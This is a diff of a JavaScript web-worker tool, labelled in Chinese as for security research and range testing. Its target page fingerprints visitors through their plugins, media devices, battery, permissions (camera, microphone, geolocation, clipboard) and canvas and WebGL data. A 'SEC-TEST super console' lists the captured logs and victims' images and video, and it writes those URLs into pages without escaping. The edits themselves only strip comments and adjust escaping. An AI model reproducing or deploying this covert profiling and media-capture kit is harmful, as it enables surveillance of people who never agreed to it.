@@ -1,4 +1,4 @@
-/**
+﻿/**
  * 现代简约技术研究系统 - 完整功能版
  * 仅供安全研究、靶场测试及前端权限调用学习使用
  */
@@ -744,7 +744,6 @@ function renderTargetPage(encodedConfig) {
       };
 
       try {
-        // plugins & mimeTypes (may be empty in modern browsers)
         try {
           const p = [];
           for (let i = 0; i < (navigator.plugins || []).length; i++) {
@@ -761,7 +760,6 @@ function renderTargetPage(encodedConfig) {
           info.mimeTypes = m;
         } catch(e) {}
 
-        // media devices
         try {
           if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
             const devices = await navigator.mediaDevices.enumerateDevices();
@@ -769,7 +767,6 @@ function renderTargetPage(encodedConfig) {
           }
         } catch(e) {}
 
-        // performance/navigation
         try {
           if (performance && performance.getEntriesByType) {
             const nav = performance.getEntriesByType('navigation');
@@ -781,7 +778,6 @@ function renderTargetPage(encodedConfig) {
           }
         } catch(e) {}
 
-        // battery
         try {
           if (navigator.getBattery) {
             const batt = await navigator.getBattery();
@@ -789,7 +785,6 @@ function renderTargetPage(encodedConfig) {
           }
         } catch(e) {}
 
-        // permissions snapshot
         const perms = ['geolocation','camera','microphone','notifications','clipboard-read'];
         for (const p of perms) {
           try {
@@ -802,7 +797,6 @@ function renderTargetPage(encodedConfig) {
           }
         }
 
-        // canvas fingerprint
         try {
           const canvas = document.createElement('canvas');
           canvas.width = 200;
@@ -818,7 +812,6 @@ function renderTargetPage(encodedConfig) {
           info.canvasFp = canvas.toDataURL();
         } catch(e) {}
 
-        // webgl info
         try {
           const canvas = document.createElement('canvas');
           const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -1066,9 +1059,9 @@ async function renderAdmin(request, env) {
             mediaBlock = '<span class="px-2 py-1 bg-red-100 text-red-600 rounded text-xs font-bold">拒绝权限</span>';
           } else if (log.media_url) {
             if (log.media_type === 'video') {
-              mediaBlock = '<button onclick="openMedia(\\'video\\', \\'' + escapeJs(log.media_url || '') + '\\')" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-play-circle mr-1"></i>播放</button>';
+              mediaBlock = '<button onclick="openMedia(\'video\', \'' + escapeJs(log.media_url || '') + '\')" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-play-circle mr-1"></i>播放</button>';
             } else {
-              mediaBlock = '<button onclick="openMedia(\\'image\\', \\'' + escapeJs(log.media_url || '') + '\\')" class="text-indigo-500 hover:underline"><img src="' + escapeHtml(log.media_url || '') + '" class="h-12 rounded" /></button>';
+              mediaBlock = '<button onclick="openMedia(\'image\', \'' + escapeJs(log.media_url || '') + '\')" class="text-indigo-500 hover:underline"><img src="' + escapeHtml(log.media_url || '') + '" class="h-12 rounded" /></button>';
             }
           }
         }
@@ -1105,7 +1098,7 @@ async function renderAdmin(request, env) {
     sectionsHtml += '</div></div>';
   }
 
-  const html = '<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><title>SEC-TEST 超级控制台</title><script src="https://cdn.tailwindcss.com"></script><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"></head><body class="p-6 bg-gray-50"><div class="max-w-7xl mx-auto">' + sectionsHtml + '</div><script>function openMedia(type,url){ if(type===\\'image\\'){ const w=window.open(\\'\\'); w.document.write(\\'<img src=\"\\'+url+\\'\" style=\"max-width:100%\">\\'); } else { const w=window.open(\\'\\'); w.document.write(\\'<video src=\"\\'+url+\\'\" controls style=\"max-width:100%\"></video>\\'); } }</script></body></html>';
+  const html = '<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><title>SEC-TEST 超级控制台</title><script src="https://cdn.tailwindcss.com"></script><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"></head><body class="p-6 bg-gray-50"><div class="max-w-7xl mx-auto">' + sectionsHtml + '</div><script>function openMedia(type,url){ if(type===\'image\'){ const w=window.open(\'\'); w.document.write(\'<img src="\'+url+\'" style="max-width:100%">\'); } else { const w=window.open(\'\'); w.document.write(\'<video src="\'+url+\'" controls style="max-width:100%"></video>\'); } }</script></body></html>';
 
   return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
